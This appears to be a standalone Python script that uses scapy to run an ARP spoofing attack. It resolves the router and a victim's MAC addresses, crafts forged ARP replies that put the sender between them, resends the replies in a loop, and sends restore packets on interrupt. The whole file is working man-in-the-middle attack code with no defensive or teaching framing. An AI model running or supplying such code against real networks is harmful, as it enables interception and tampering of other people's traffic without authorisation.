from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
import time
import sys

def main():
    this_mac = get_if_hwaddr(conf.iface)
    router_ip: str = conf.route.route("0.0.0.0")[2]  # Named router_ip so won't confuse with conf.route.default_gateway
    victim_ip: str = "0.0.0.0"  # The ip address of the victim to the attack

    router_mac = get_mac(router_ip)
    victim_mac = get_mac(victim_ip)

    router_reply = craft_poison_reply(router_ip, router_mac, victim_ip, this_mac)
    victim_reply = craft_poison_reply(victim_ip, victim_mac, router_ip, this_mac)

    while True:
        try:
            sendp(router_reply)
            sendp(victim_reply)
        except KeyboardInterrupt:
            restores = craft_restore_packets(victim_ip, victim_mac, router_ip, router_mac)
            victim_restore = restores[0]
            router_restore = restores[1]

            sendp(victim_restore, count=7, inter=0.2)
            sendp(router_restore, count=7, inter=0.2)
            sys.exit(1)
        time.sleep(5)



def get_mac(target_ip: str) -> str:
    packet: Packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, op=1)

    ans, _ = srp(packet, timeout=2, inter=0.1)
    if not ans:
        raise ValueError("No answers received!")
    ans_reply = ans[0][1]
    return ans_reply.hwsrc



def craft_poison_reply(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str) -> Packet:
    return Ether(
        src=attacker_mac,
        dst=target_mac) / ARP(
        psrc=spoof_ip,
        pdst=target_ip,
        hwsrc=attacker_mac,
        hwdst=target_mac,
        op=2
    )

def craft_restore_packets(target_ip: str, target_mac: str, router_ip: str, router_mac: str) -> list[Packet]:
    # Targeted packet for the victim
    victim_restore = Ether(dst=target_mac) / ARP(
        op=2,  # ARP Reply
        psrc=router_ip,
        hwsrc=router_mac,
        pdst=target_ip,
        hwdst=target_mac
    )

    # Targeted packet for the router
    router_restore = Ether(dst=router_mac) / ARP(
        op=2,
        psrc=target_ip,
        hwsrc=target_mac,
        pdst=router_ip,
        hwdst=router_mac
    )

    return [victim_restore, router_restore]



